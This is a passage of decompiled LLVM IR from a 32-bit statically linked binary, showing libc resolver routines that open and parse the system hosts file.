  store i32 %v1_8059902, i32* %esi.global-to-local, align 4
  %v1_8059905 = inttoptr i32 %v0_8059902 to i8*
  %v2_8059905 = load i8, i8* %v1_8059905, align 1
  %v3_8059905 = zext i8 %v2_8059905 to i32
  %v1_8059908 = add i32 %v0_8059902, 1
  %v2_8059908 = inttoptr i32 %v1_8059908 to i8*
  %v3_8059908 = load i8, i8* %v2_8059908, align 1
  %v4_8059908 = zext i8 %v3_8059908 to i32
  %v2_805990c = mul nuw nsw i32 %v3_8059905, 256
  %v2_805990f = or i32 %v4_8059908, %v2_805990c
  %v1_8059911 = load i32, i32* @ebp, align 4
  %v2_8059911 = add i32 %v1_8059911, 4
  %v3_8059911 = inttoptr i32 %v2_8059911 to i32*
  store i32 %v2_805990f, i32* %v3_8059911, align 4
  %v0_8059914 = load i32, i32* @ebx, align 4
  %v1_8059914 = add i32 %v0_8059914, 2
  %v2_8059914 = inttoptr i32 %v1_8059914 to i8*
  %v3_8059914 = load i8, i8* %v2_8059914, align 1
  %v4_8059914 = zext i8 %v3_8059914 to i32
  %v1_8059918 = add i32 %v0_8059914, 3
  %v2_8059918 = inttoptr i32 %v1_8059918 to i8*
  %v3_8059918 = load i8, i8* %v2_8059918, align 1
  %v4_8059918 = zext i8 %v3_8059918 to i32
  %v2_805991c = mul nuw nsw i32 %v4_8059914, 256
  %v2_805991f = or i32 %v4_8059918, %v2_805991c
  %v1_8059921 = load i32, i32* @ebp, align 4
  %v2_8059921 = add i32 %v1_8059921, 8
  %v3_8059921 = inttoptr i32 %v2_8059921 to i32*
  store i32 %v2_805991f, i32* %v3_8059921, align 4
  %v0_8059924 = load i32, i32* @ebx, align 4
  %v1_8059924 = add i32 %v0_8059924, 4
  %v2_8059924 = inttoptr i32 %v1_8059924 to i8*
  %v3_8059924 = load i8, i8* %v2_8059924, align 1
  %v4_8059924 = zext i8 %v3_8059924 to i32
  %v0_8059928 = load i32, i32* %esi.global-to-local, align 4
  %v1_8059928 = add i32 %v0_8059928, 1
  %v2_8059928 = inttoptr i32 %v1_8059928 to i8*
  %v3_8059928 = load i8, i8* %v2_8059928, align 1
  %v4_8059928 = zext i8 %v3_8059928 to i32
  %v2_805992c = mul nuw i32 %v4_8059924, 16777216
  %v2_805992f = mul nuw nsw i32 %v4_8059928, 65536
  %v1_8059932 = add i32 %v0_8059928, 2
  %v2_8059932 = inttoptr i32 %v1_8059932 to i8*
  %v3_8059932 = load i8, i8* %v2_8059932, align 1
  %v4_8059932 = zext i8 %v3_8059932 to i32
  %v2_8059936 = mul nuw nsw i32 %v4_8059932, 256
  %v2_8059939 = or i32 %v2_805992f, %v2_805992c
  %v1_805993b = add i32 %v0_8059928, 3
  %v2_805993b = inttoptr i32 %v1_805993b to i8*
  %v3_805993b = load i8, i8* %v2_805993b, align 1
  %v4_805993b = zext i8 %v3_805993b to i32
  %v2_805993f = or i32 %v4_805993b, %v2_8059939
  %v2_8059941 = or i32 %v2_805993f, %v2_8059936
  store i32 %v2_8059941, i32* @ecx, align 4
  %v1_8059943 = load i32, i32* @ebp, align 4
  %v2_8059943 = add i32 %v1_8059943, 12
  %v3_8059943 = inttoptr i32 %v2_8059943 to i32*
  store i32 %v2_8059941, i32* %v3_8059943, align 4
  %v0_8059946 = load i32, i32* @ebx, align 4
  %v1_8059946 = add i32 %v0_8059946, 8
  %v2_8059946 = inttoptr i32 %v1_8059946 to i8*
  %v3_8059946 = load i8, i8* %v2_8059946, align 1
  %v4_8059946 = zext i8 %v3_8059946 to i32
  %v1_805994a = add i32 %v0_8059946, 9
  %v2_805994a = inttoptr i32 %v1_805994a to i8*
  %v3_805994a = load i8, i8* %v2_805994a, align 1
  %v4_805994a = zext i8 %v3_805994a to i32
  %v2_805994e = mul nuw nsw i32 %v4_8059946, 256
  %v1_8059951 = add i32 %v0_8059946, 10
  %v2_8059954 = or i32 %v4_805994a, %v2_805994e
  store i32 %v2_8059954, i32* @edx, align 4
  %v1_8059956 = load i32, i32* @ebp, align 4
  %v2_8059956 = add i32 %v1_8059956, 20
  %v3_8059956 = inttoptr i32 %v2_8059956 to i32*
  store i32 %v1_8059951, i32* %v3_8059956, align 4
  %v0_8059959 = load i32, i32* @edx, align 4
  %v1_8059959 = load i32, i32* @ebp, align 4
  %v2_8059959 = add i32 %v1_8059959, 16
  %v3_8059959 = inttoptr i32 %v2_8059959 to i32*
  store i32 %v0_8059959, i32* %v3_8059959, align 4
  %v1_8059963 = add i32 %v3_80598cf, 10
  %v1_8059966 = load i32, i32* @ebp, align 4
  %v2_8059966 = add i32 %v1_8059966, 24
  %v3_8059966 = inttoptr i32 %v2_8059966 to i32*
  store i32 %v1_8059963, i32* %v3_8059966, align 4
  %v4_8059969 = load i32, i32* @edx, align 4
  %v5_805996d = icmp slt i32 %v1_80598d7, %v4_8059969
  br i1 %v5_805996d, label %dec_label_pc_805996f, label %dec_label_pc_8059974

dec_label_pc_805996f:                             ; preds = %dec_label_pc_80598e7
  br label %dec_label_pc_8059978

dec_label_pc_8059974:                             ; preds = %dec_label_pc_80598e7
  %v1_8059974 = load i32, i32* @edi, align 4
  %v2_8059974 = add i32 %v4_8059969, 10
  %v3_8059974 = add i32 %v2_8059974, %v1_8059974
  br label %dec_label_pc_8059978

dec_label_pc_8059978:                             ; preds = %entry, %dec_label_pc_805996f, %dec_label_pc_80598e0, %dec_label_pc_8059974
  %v0_805997e = phi i32 [ %v4_80598bd, %entry ], [ -1, %dec_label_pc_805996f ], [ %v1_80598d7, %dec_label_pc_80598e0 ], [ %v3_8059974, %dec_label_pc_8059974 ]
  %v2_8059980 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059980, i32* @ebx, align 4
  store i32 %v0_805988e, i32* @esi, align 4
  store i32 %v0_805988d, i32* @edi, align 4
  store i32 %v0_805988c, i32* @ebp, align 4
  ret i32 %v0_805997e

; uselistorder directives
  uselistorder i32 %v1_80598d7, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80598cf, { 1, 0, 2 }
  uselistorder i32 %v4_80598bd, { 1, 0, 2, 3 }
  uselistorder i32 24, { 31, 32, 5, 2, 6, 0, 46, 49, 50, 1, 18, 19, 20, 21, 22, 3, 17, 48, 7, 33, 34, 35, 47, 9, 23, 38, 24, 51, 29, 36, 39, 40, 41, 42, 43, 44, 45, 52, 4, 37, 25, 26, 27, 28, 54, 53, 30, 8, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 11, 14, 12, 15, 13, 17, 16, 18, 20, 19 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 3, 4, 0, 1 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_8059978, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8059995 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805cd2b.350 to i32), i32 ptrtoint (i32* @global_var_805cc3c.321 to i32))
  store i32 %v3_8059995, i32* @eax, align 4
  %v1_805999d = icmp eq i32 %v3_8059995, 0
  %v1_805999f = icmp eq i1 %v1_805999d, false
  br i1 %v1_805999f, label %dec_label_pc_80599b5, label %dec_label_pc_80599a1

dec_label_pc_80599a1:                             ; preds = %entry
  %v3_80599ad = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805cd36.351 to i32), i32 ptrtoint (i32* @global_var_805cc3c.321 to i32))
  br label %dec_label_pc_80599b5

dec_label_pc_80599b5:                             ; preds = %entry, %dec_label_pc_80599a1
  %v0_80599b8 = phi i32 [ %v3_8059995, %entry ], [ %v3_80599ad, %dec_label_pc_80599a1 ]
  ret i32 %v0_80599b8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805cc3c.321 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80599b5, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80599b9 = load i32, i32* @ebp, align 4
  %v0_80599ba = load i32, i32* @edi, align 4
  %v0_80599bb = load i32, i32* @esi, align 4
  %v0_80599bc = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80599ca = sub i32 0, %arg6
  %v1_80599cc = urem i32 %v1_80599ca, 4
  %v2_80599cc = icmp eq i32 %v1_80599cc, 0
  store i32 %v1_80599cc, i32* %eax.global-to-local, align 4
  br i1 %v2_80599cc, label %dec_label_pc_80599dd, label %dec_label_pc_80599d1

dec_label_pc_80599d1:                             ; preds = %entry
  %v2_80599d1 = sub i32 %arg7, %v1_80599cc
  %v7_80599d1 = icmp ugt i32 %v1_80599cc, %arg7
  br i1 %v7_80599d1, label %dec_label_pc_8059c81, label %dec_label_pc_80599d9

dec_label_pc_80599d9:                             ; preds = %dec_label_pc_80599d1
  %v2_80599d9 = add i32 %v1_80599cc, %arg6
  store i32 %v2_80599d9, i32* @ebx, align 4
  store i32 %v2_80599d1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80599dd

dec_label_pc_80599dd:                             ; preds = %entry, %dec_label_pc_80599d9
  %v0_80599e6 = phi i32 [ %arg6, %entry ], [ %v2_80599d9, %dec_label_pc_80599d9 ]
  %v0_80599e9 = phi i32 [ %arg7, %entry ], [ %v2_80599d1, %dec_label_pc_80599d9 ]
  %tmp154 = icmp ult i32 %v0_80599e9, 32
  br i1 %tmp154, label %dec_label_pc_8059c81, label %dec_label_pc_80599e6

dec_label_pc_80599e6:                             ; preds = %dec_label_pc_80599dd
  %v1_80599e6 = add i32 %v0_80599e6, 32
  store i32 %v1_80599e6, i32* %eax.global-to-local, align 4
  %v1_80599e9 = add i32 %v0_80599e9, -32
  store i32 %v1_80599e9, i32* @ebp, align 4
  %v5_80599ec = inttoptr i32 %v1_80599e6 to i8*
  %v12_80599f0 = icmp eq i32 %arg4, 1
  br i1 %v12_80599f0, label %dec_label_pc_8059b12, label %dec_label_pc_80599fb

dec_label_pc_80599fb:                             ; preds = %dec_label_pc_80599e6
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8059a02 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8059a02, align 4
  %tmp155 = icmp ult i32 %v1_80599e9, 4
  br i1 %tmp155, label %dec_label_pc_8059c81, label %dec_label_pc_8059a0e

dec_label_pc_8059a0e:                             ; preds = %dec_label_pc_80599fb
  %v0_8059a0e = load i32, i32* %edx.global-to-local, align 4
  %v1_8059a0e = add i32 %v0_8059a0e, -36
  store i32 %v1_8059a0e, i32* %eax.global-to-local, align 4
  %tmp156 = icmp ult i32 %v1_8059a0e, 8
  br i1 %tmp156, label %dec_label_pc_8059c81, label %dec_label_pc_8059a1a

dec_label_pc_8059a1a:                             ; preds = %dec_label_pc_8059a0e
  %v0_8059a1a = load i32, i32* @ebp, align 4
  %tmp157 = icmp ult i32 %v0_8059a1a, 16
  br i1 %tmp157, label %dec_label_pc_8059c81, label %dec_label_pc_8059a23

dec_label_pc_8059a23:                             ; preds = %dec_label_pc_8059a1a
  %v1_8059a23 = add i32 %v0_8059a0e, -48
  store i32 %v1_8059a23, i32* %eax.global-to-local, align 4
  %tmp158 = icmp ult i32 %v1_8059a23, 8
  br i1 %tmp158, label %dec_label_pc_8059c81, label %dec_label_pc_8059a2f

dec_label_pc_8059a2f:                             ; preds = %dec_label_pc_8059a23
  %v0_8059a2f = load i32, i32* @ebx, align 4
  %v1_8059a2f = add i32 %v0_8059a2f, 48
  %v1_8059a32 = add i32 %v0_8059a0e, -44
  store i32 %v1_8059a32, i32* @ebp, align 4
  %v1_8059a39 = add i32 %v0_8059a0e, -56
  store i32 %v1_8059a39, i32* @eax, align 4
  %v1_8059a3c = add i32 %v0_8059a2f, 36
  store i32 %v1_8059a3c, i32* @edi, align 4
  %v7_8059a3f = icmp ult i32 %v1_8059a39, %v1_8059a32
  br i1 %v7_8059a3f, label %dec_label_pc_8059a48, label %dec_label_pc_8059a43

dec_label_pc_8059a43:                             ; preds = %dec_label_pc_8059a2f
  %v1_8059a43 = add i32 %v0_8059a2f, 44
  store i32 %v1_8059a43, i32* @esi, align 4
  br label %dec_label_pc_8059a4d

dec_label_pc_8059a48:                             ; preds = %dec_label_pc_8059a2f
  %v1_8059a48 = add i32 %v0_8059a2f, 56
  store i32 %v1_8059a48, i32* @esi, align 4
  store i32 %v1_8059a39, i32* @ebp, align 4
  br label %dec_label_pc_8059a4d

dec_label_pc_8059a4d:                             ; preds = %dec_label_pc_8059a43, %dec_label_pc_8059a48
  %v0_8059a4d = phi i32 [ %v1_8059a32, %dec_label_pc_8059a43 ], [ %v1_8059a39, %dec_label_pc_8059a48 ]
  %tmp159 = icmp ult i32 %v0_8059a4d, 80
  br i1 %tmp159, label %dec_label_pc_8059c81, label %dec_label_pc_8059a56

dec_label_pc_8059a56:                             ; preds = %dec_label_pc_8059a4d
  %v0_8059a56 = call i32 @__open_etc_hosts()
  store i32 %v0_8059a56, i32* %eax.global-to-local, align 4
  %v1_8059a5f = icmp eq i32 %v0_8059a56, 0
  br i1 %v1_8059a5f, label %dec_label_pc_8059a83, label %dec_label_pc_8059a63

dec_label_pc_8059a63:                             ; preds = %dec_label_pc_8059a56
  store i32 %v1_80599e6, i32* %edx.global-to-local, align 4
  store i32 %v1_8059a2f, i32* %eax.global-to-local, align 4
  store i8* %v5_80599ec, i8** %stack_var_-44, align 4
  %v0_8059a6e = load i32, i32* @edi, align 4
  %v0_8059a7a = load i32, i32* @esi, align 4
  %v5_8059a7a = inttoptr i32 %v0_8059a7a to i8*
  br label %dec_label_pc_8059b31

dec_label_pc_8059a83:                             ; preds = %dec_label_pc_8059a56
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8059a87 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8059a87, align 4
  %v1_8059a8d = call i32 @__errno_location(i32 0)
  store i32 %v1_8059a8d, i32* %eax.global-to-local, align 4
  %v1_8059a92 = inttoptr i32 %v1_8059a8d to i32*
  %v2_8059a92 = load i32, i32* %v1_8059a92, align 4
  store i32 %v2_8059a92, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059c81

dec_label_pc_8059a9d:                             ; preds = %dec_label_pc_8059c04
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8059aa1 = load i8*, i8** %stack_var_-44, align 4
  %v3_8059aa1 = ptrtoint i8* %v2_8059aa1 to i32
  %v2_8059aa4 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8059aa1, i32* %v2_8059aa4, align 4
  %v0_8059aa6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059aa6 = add i32 %v0_8059aa6, 4
  %v2_8059aa6 = inttoptr i32 %v1_8059aa6 to i32*
  store i32 0, i32* %v2_8059aa6, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8059ab1 = load i32, i32* @ebx, align 4
  %v1_8059ab1 = add i32 %v0_8059ab1, 4
  %v2_8059ab1 = inttoptr i32 %v1_8059ab1 to i32*
  %v3_8059ab1 = load i32, i32* %v2_8059ab1, align 4
  store i32 %v3_8059ab1, i32* %eax.global-to-local, align 4
  store i32 %v3_8059ab1, i32* %arg5, align 4
  %v0_8059ab6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059ab6 = add i32 %v0_8059ab6, 8
  %v2_8059ab6 = inttoptr i32 %v1_8059ab6 to i32*
  store i32 2, i32* %v2_8059ab6, align 4
  %v0_8059abd = load i32, i32* %edx.global-to-local, align 4
  %v1_8059abd = add i32 %v0_8059abd, 12
  %v2_8059abd = inttoptr i32 %v1_8059abd to i32*
  store i32 4, i32* %v2_8059abd, align 4
  br label %dec_label_pc_8059af6

dec_label_pc_8059aca:                             ; preds = %dec_label_pc_8059c26
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8059ad2 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8059ad2, align 4
  %v0_8059ad4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059ad4 = add i32 %v0_8059ad4, 4
  %v2_8059ad4 = inttoptr i32 %v1_8059ad4 to i32*
  store i32 0, i32* %v2_8059ad4, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8059adf = load i32, i32* @ebx, align 4
  %v1_8059adf = add i32 %v0_8059adf, 4
  %v2_8059adf = inttoptr i32 %v1_8059adf to i32*
  %v3_8059adf = load i32, i32* %v2_8059adf, align 4
  store i32 %v3_8059adf, i32* %eax.global-to-local, align 4
  store i32 %v3_8059adf, i32* %arg5, align 4
  %v0_8059ae4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059ae4 = add i32 %v0_8059ae4, 8
  %v2_8059ae4 = inttoptr i32 %v1_8059ae4 to i32*
  store i32 10, i32* %v2_8059ae4, align 4
  %v0_8059aeb = load i32, i32* %edx.global-to-local, align 4
  %v1_8059aeb = add i32 %v0_8059aeb, 12
  %v2_8059aeb = inttoptr i32 %v1_8059aeb to i32*
  store i32 16, i32* %v2_8059aeb, align 4
  br label %dec_label_pc_8059af6

dec_label_pc_8059af6:                             ; preds = %dec_label_pc_8059a9d, %dec_label_pc_8059aca
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8059a9d ], [ %stack_var_-32.0, %dec_label_pc_8059aca ]
  %v1_8059af6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059af6 = add i32 %v1_8059af6, 16
  %v3_8059af6 = inttoptr i32 %v2_8059af6 to i32*
  store i32 %storemerge, i32* %v3_8059af6, align 4
  %v0_8059af9 = load i32, i32* @ebx, align 4
  %v1_8059af9 = add i32 %v0_8059af9, 8
  %v1_8059afc = load i32, i32* %edx.global-to-local, align 4
  %v2_8059afc = add i32 %v1_8059afc, 4
  %v3_8059afc = inttoptr i32 %v2_8059afc to i32*
  store i32 %v1_8059af9, i32* %v3_8059afc, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_8059b03 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059b03 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8059b03, i32* %v2_8059b03, align 4
  br label %dec_label_pc_8059c61

dec_label_pc_8059b12:                             ; preds = %dec_label_pc_80599e6
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8059b31

dec_label_pc_8059b31:                             ; preds = %dec_label_pc_8059a63, %dec_label_pc_8059b12
  %v1_8059b35.pre-phi = phi i32* [ %v1_8059a02, %dec_label_pc_8059a63 ], [ %.pre, %dec_label_pc_8059b12 ]
  %stack_var_-32.0 = phi i32 [ %v1_8059a2f, %dec_label_pc_8059a63 ], [ 0, %dec_label_pc_8059b12 ]
  %stack_var_-36.0 = phi i32 [ %v1_80599e6, %dec_label_pc_8059a63 ], [ 0, %dec_label_pc_8059b12 ]
  %stack_var_-40.0 = phi i32 [ %v0_8059a6e, %dec_label_pc_8059a63 ], [ 0, %dec_label_pc_8059b12 ]
  %stack_var_4.0 = phi i32 [ %v0_8059a56, %dec_label_pc_8059a63 ], [ %arg1, %dec_label_pc_8059b12 ]
  %stack_var_-20.0 = phi i8* [ %v5_8059a7a, %dec_label_pc_8059a63 ], [ %v5_80599ec, %dec_label_pc_8059b12 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8059b35.pre-phi, align 4
  %v4_8059c4d = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8059bea = inttoptr i32 %arg2 to i8*
  %v0_8059c47125132 = load i32, i32* @edx, align 4
  %v3_8059c51126133 = call i32 @fgets(i32 %v4_8059c4d, i32 %stack_var_4.0, i32 %v0_8059c47125132)
  store i32 %v3_8059c51126133, i32* %eax.global-to-local, align 4
  %v1_8059c59127134 = icmp eq i32 %v3_8059c51126133, 0
  %v1_8059c5b128135 = icmp eq i1 %v1_8059c59127134, false
  br i1 %v1_8059c5b128135, label %dec_label_pc_8059b48.lr.ph.lr.ph, label %dec_label_pc_8059c61

dec_label_pc_8059b48.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8059b31
  %v12_8059c1f = icmp eq i32 %arg3, 10
  %v12_8059bfd = icmp eq i32 %arg3, 2
  %v12_8059bc4 = icmp eq i32 %arg4, 2
  %v1_8059bc9 = icmp eq i1 %v12_8059bc4, false
  %v1_8059c02 = icmp eq i1 %v12_8059bfd, false
  %v1_8059c24 = icmp eq i1 %v12_8059c1f, false
  br label %dec_label_pc_8059b48.lr.ph

dec_label_pc_8059b48.lr.ph:                       ; preds = %dec_label_pc_8059b48.lr.ph.lr.ph, %dec_label_pc_8059c47.outer.backedge
  %v3_8059c51126137 = phi i32 [ %v3_8059c51126133, %dec_label_pc_8059b48.lr.ph.lr.ph ], [ %v3_8059c51126, %dec_label_pc_8059c47.outer.backedge ]
  %stack_var_-28.0.ph136 = phi i32 [ 1, %dec_label_pc_8059b48.lr.ph.lr.ph ], [ 2, %dec_label_pc_8059c47.outer.backedge ]
  br label %dec_label_pc_8059b48

dec_label_pc_8059b48:                             ; preds = %dec_label_pc_8059b48.lr.ph, %dec_label_pc_8059c47.backedge
  %v3_8059c51129 = phi i32 [ %v3_8059c51126137, %dec_label_pc_8059b48.lr.ph ], [ %v3_8059c51, %dec_label_pc_8059c47.backedge ]
  %v5_8059b50 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35, i32 %v3_8059c51129, i32 %v3_8059c51129)
  store i32 %v5_8059b50, i32* @eax, align 4
  %v1_8059b58 = icmp eq i32 %v5_8059b50, 0
  br i1 %v1_8059b58, label %dec_label_pc_8059b5f, label %dec_label_pc_8059b5c

dec_label_pc_8059b5c:                             ; preds = %dec_label_pc_8059b48
  %v1_8059b5c = inttoptr i32 %v5_8059b50 to i8*
  store i8 0, i8* %v1_8059b5c, align 1
  br label %dec_label_pc_8059b5f

dec_label_pc_8059b5f:                             ; preds = %dec_label_pc_8059b48, %dec_label_pc_8059b5c
  store i32 %v4_8059c4d, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8059b9f32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8059b9f33 = icmp eq i8 %v2_8059b9f32, 0
  %v1_8059ba239 = icmp eq i1 %v3_8059b9f33, false
  br i1 %v1_8059ba239, label %dec_label_pc_8059b6b.preheader.preheader, label %dec_label_pc_8059ba4

dec_label_pc_8059b6b.preheader.preheader:         ; preds = %dec_label_pc_8059b5f
  %v4_8059b6b97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8059b6b.preheader

dec_label_pc_8059b67:                             ; preds = %dec_label_pc_8059b71
  store i8 0, i8* %v1_8059b6b102, align 1
  %v0_8059b6a = load i32, i32* @ecx, align 4
  %v1_8059b6a = add i32 %v0_8059b6a, 1
  store i32 %v1_8059b6a, i32* @ecx, align 4
  %v1_8059b6b = inttoptr i32 %v1_8059b6a to i8*
  %v2_8059b6b = load i8, i8* %v1_8059b6b, align 1
  %v3_8059b6b = zext i8 %v2_8059b6b to i32
  %v4_8059b6b = load i32, i32* %eax.global-to-local, align 4
  %v5_8059b6b = and i32 %v4_8059b6b, -256
  %v6_8059b6b = or i32 %v5_8059b6b, %v3_8059b6b
  store i32 %v6_8059b6b, i32* @eax, align 4
  %v4_8059b6d = icmp eq i8 %v2_8059b6b, 0
  br i1 %v4_8059b6d, label %dec_label_pc_8059b6b.dec_label_pc_8059ba4.loopexit_crit_edge, label %dec_label_pc_8059b71

dec_label_pc_8059b71:                             ; preds = %dec_label_pc_8059b6b.preheader, %dec_label_pc_8059b67
  %v2_8059b6b103 = phi i8 [ %v2_8059b6b, %dec_label_pc_8059b67 ], [ %v2_8059b6b95, %dec_label_pc_8059b6b.preheader ]
  %v1_8059b6b102 = phi i8* [ %v1_8059b6b, %dec_label_pc_8059b67 ], [ %v1_8059b6b94, %dec_label_pc_8059b6b.preheader ]
  %v0_8059b67101 = phi i32 [ %v1_8059b6a, %dec_label_pc_8059b67 ], [ %v0_8059b6b47, %dec_label_pc_8059b6b.preheader ]
  %v2_8059b71 = sext i8 %v2_8059b6b103 to i32
  store i32 %v2_8059b71, i32* @edx, align 4
  %v0_8059b74 = load i32, i32* @global_var_8062a20, align 32
  store i32 %v0_8059b74, i32* %eax.global-to-local, align 4
  %v2_8059b79 = mul nsw i32 %v2_8059b71, 2
  %v3_8059b79 = add i32 %v0_8059b74, %v2_8059b79
  %v4_8059b79 = inttoptr i32 %v3_8059b79 to i8*
  %v5_8059b79 = load i8, i8* %v4_8059b79, align 1
  %v6_8059b79 = and i8 %v5_8059b79, 32
  %v7_8059b79 = icmp eq i8 %v6_8059b79, 0
  %v1_8059b7d = icmp eq i1 %v7_8059b79, false
  br i1 %v1_8059b7d, label %dec_label_pc_8059b67, label %dec_label_pc_8059b7f

dec_label_pc_8059b7f:                             ; preds = %dec_label_pc_8059b71
  %v0_8059b7f = load i32, i32* @edi, align 4
  %v1_8059b7f = add i32 %v0_8059b7f, -6
  %v6_8059b7f = sub i32 5, %v0_8059b7f
  %v7_8059b7f = and i32 %v6_8059b7f, %v0_8059b7f
  %v8_8059b7f = icmp slt i32 %v7_8059b7f, 0
  %v9_8059b7f = icmp eq i32 %v1_8059b7f, 0
  %v10_8059b7f = icmp slt i32 %v1_8059b7f, 0
  %v3_8059b82 = icmp eq i1 %v10_8059b7f, %v8_8059b7f
  %v4_8059b82 = icmp eq i1 %v9_8059b7f, false
  %v5_8059b82 = and i1 %v4_8059b82, %v3_8059b82
  br i1 %v5_8059b82, label %dec_label_pc_8059b8b.preheader, label %dec_label_pc_8059b84

dec_label_pc_8059b84:                             ; preds = %dec_label_pc_8059b7f
  %v1_8059b84 = load i32, i32* @ebx, align 4
  %v3_8059b84 = mul i32 %v0_8059b7f, 4
  %v4_8059b84 = add i32 %v1_8059b84, %v3_8059b84
  %v5_8059b84 = inttoptr i32 %v4_8059b84 to i32*
  store i32 %v0_8059b67101, i32* %v5_8059b84, align 4
  %v0_8059b87 = load i32, i32* @edi, align 4
  %v1_8059b87 = add i32 %v0_8059b87, 1
  store i32 %v1_8059b87, i32* @edi, align 4
  %v0_8059b8b.pre.pre = load i32, i32* @ecx, align 4
  %v4_8059b8b.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059b8b.preheader

dec_label_pc_8059b8b.preheader:                   ; preds = %dec_label_pc_8059b84, %dec_label_pc_8059b7f
  %v4_8059b8b.pre = phi i32 [ %v4_8059b8b.pre.pre, %dec_label_pc_8059b84 ], [ %v0_8059b74, %dec_label_pc_8059b7f ]
  %v0_8059b8b.pre = phi i32 [ %v0_8059b8b.pre.pre, %dec_label_pc_8059b84 ], [ %v0_8059b67101, %dec_label_pc_8059b7f ]
  %v1_8059ba452 = phi i32 [ %v1_8059b87, %dec_label_pc_8059b84 ], [ %v0_8059b7f, %dec_label_pc_8059b7f ]
  %v1_8059b8b104 = inttoptr i32 %v0_8059b8b.pre to i8*
  %v2_8059b8b105 = load i8, i8* %v1_8059b8b104, align 1
  %v3_8059b8b106 = zext i8 %v2_8059b8b105 to i32
  %v5_8059b8b107 = and i32 %v4_8059b8b.pre, -256
  %v6_8059b8b108 = or i32 %v3_8059b8b106, %v5_8059b8b107
  store i32 %v6_8059b8b108, i32* @eax, align 4
  %v4_8059b8d109 = icmp eq i8 %v2_8059b8b105, 0
  br i1 %v4_8059b8d109, label %dec_label_pc_8059b9f.loopexit, label %dec_label_pc_8059b91.lr.ph

dec_label_pc_8059b91.lr.ph:                       ; preds = %dec_label_pc_8059b8b.preheader
  %v0_8059b94.pre = load i32, i32* @global_var_8062a20, align 32
  br label %dec_label_pc_8059b91

dec_label_pc_8059b8a:                             ; preds = %dec_label_pc_8059b91
  %v1_8059b8a = add i32 %v0_8059b9f110, 1
  store i32 %v1_8059b8a, i32* @ecx, align 4
  %v1_8059b8b = inttoptr i32 %v1_8059b8a to i8*
  %v2_8059b8b = load i8, i8* %v1_8059b8b, align 1
  %v3_8059b8b = zext i8 %v2_8059b8b to i32
  %v5_8059b8b = and i32 %v0_8059b94.pre, -256
  %v6_8059b8b = or i32 %v3_8059b8b, %v5_8059b8b
  store i32 %v6_8059b8b, i32* @eax, align 4
  %v4_8059b8d = icmp eq i8 %v2_8059b8b, 0
  br i1 %v4_8059b8d, label %dec_label_pc_8059b9f.loopexit, label %dec_label_pc_8059b91

dec_label_pc_8059b91:                             ; preds = %dec_label_pc_8059b91.lr.ph, %dec_label_pc_8059b8a
  %v2_8059b8b112 = phi i8 [ %v2_8059b8b105, %dec_label_pc_8059b91.lr.ph ], [ %v2_8059b8b, %dec_label_pc_8059b8a ]
  %v1_8059b8b111 = phi i8* [ %v1_8059b8b104, %dec_label_pc_8059b91.lr.ph ], [ %v1_8059b8b, %dec_label_pc_8059b8a ]
  %v0_8059b9f110 = phi i32 [ %v0_8059b8b.pre, %dec_label_pc_8059b91.lr.ph ], [ %v1_8059b8a, %dec_label_pc_8059b8a ]
  %v2_8059b91 = sext i8 %v2_8059b8b112 to i32
  store i32 %v2_8059b91, i32* @edx, align 4
